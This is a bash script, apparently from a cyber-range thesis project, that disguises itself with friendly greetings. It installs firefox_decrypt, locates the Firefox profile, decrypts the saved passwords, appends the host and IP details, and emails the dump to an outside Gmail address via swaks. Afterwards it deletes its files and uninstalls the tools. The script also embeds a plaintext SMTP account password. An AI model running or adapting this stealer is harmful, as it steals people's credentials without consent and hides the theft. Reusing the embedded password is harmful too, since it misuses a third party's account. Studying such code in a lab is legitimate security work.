#!/bin/bash
# Firefox Password Sender hided
# Deak Peter | 2025.03.03. | OE CyberRange

echo "Hello, whats up?"
#echo "firefox_decrypt install"
 sudo apt install git >/dev/null 2>&1
 git clone https://github.com/unode/firefox_decrypt.git >/dev/null 2>&1
 cd firefox_decrypt

 USER_PATH=$( awk -F: '$3 >= 1000 && $1 !~ /^(root|daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody)$/ {print $1}' /etc/passwd )
#echo  /home/$USER_PATH/firefox_decrypt
 cd /home/$USER_PATH/Downloads/firefox_decrypt

echo "I hope you have a fantastic day. :)"
#echo "Find Firefox profile"

# PROFILE_PATH=$(find ~ -name "profiles.ini"  | grep "/firefox/profiles.ini" | head -n 1)
# PROFILE_PATH=$(find / -name "profiles.ini" -type d  | grep "/firefox/profiles.ini" )
 PROFILE_PATH=$(find / -name "profiles.ini" 2>/dev/null  | grep "/firefox/profiles.ini" )
 PROFILE_DIR=$(dirname "$PROFILE_PATH")
#echo "Firefox profil könyvtár: $PROFILE_DIR"

echo "Enjoy the sunshine."
#echo "Profile decrypt es Data dump"
 nohup echo "=== Exported: $(date '+%Y-%m-%d %H:%M:%S') ===" >> exported_passwords.txt 2>/dev/null &disown
#{ nohup  echo -n "Publikus IP: "; nc checkip.amazonaws.com 80 <<< $'GET / HTTP/1.1\r\nHost: checkip.amazonaws.com\r\nConnection: close\r\n\r\n' | tail -n 1; } >> exported_passwords.txt &disown
 nohup echo "Hostnév: $(hostname)" >> exported_passwords.txt 2>/dev/null &disown
 nohup echo "Lokális IP: $(hostname -I | awk '{print $1}')" >> exported_passwords.txt 2>/dev/null &disown
 nohup echo "Publikus IP: 45.44.43.42" >> exported_passwords.txt 2>/dev/null &disown
 nohup echo "------------------------------" >> exported_passwords.txt 2>/dev/null &disown

#nohup  python3 firefox_decrypt.py "$PROFILE_DIR" >> exported_passwords.txt 2>/dev/null &disown
 python3 firefox_decrypt.py "$PROFILE_DIR" >> exported_passwords.txt

 echo "Take a sit."
#echo "Installing sender"

 sudo apt install -y swaks >/dev/null 2>&1

echo "And have a rest."
 swaks --to dekacster@gmail.com \
      --server smtp.freemail.hu \
      --port 587 \
      --auth LOGIN \
      --auth-user npctest3@freemail.hu \
      --auth-password "JVk0qiaahOmAEaeMsNaY" \
      --tls \
      --from npctest3@freemail.hu \
      --header "From: npctest3@freemail.hu" \
      --header "Subject: Firefox credentials [DIPLOMAMUNKA]" \
      --body "$(cat /home/$USER_PATH/Downloads/firefox_decrypt/exported_passwords.txt)" >/dev/null 2>&1

echo "Everything will be good... "
BLUE="\033[34m"
RED="\033[31m"
YELLOW="\033[33m"
RESET="\033[0m"
echo -e "${RED}****And thanks for your FireFox passwords****${RESET}"
#echo "Cleaning..."

 rm -f exported_passwords.txt
 sudo apt remove -y git swaks >/dev/null 2>&1
 rm -rf "/home/$USER_PATH/Downloads/firefox_decrypt"
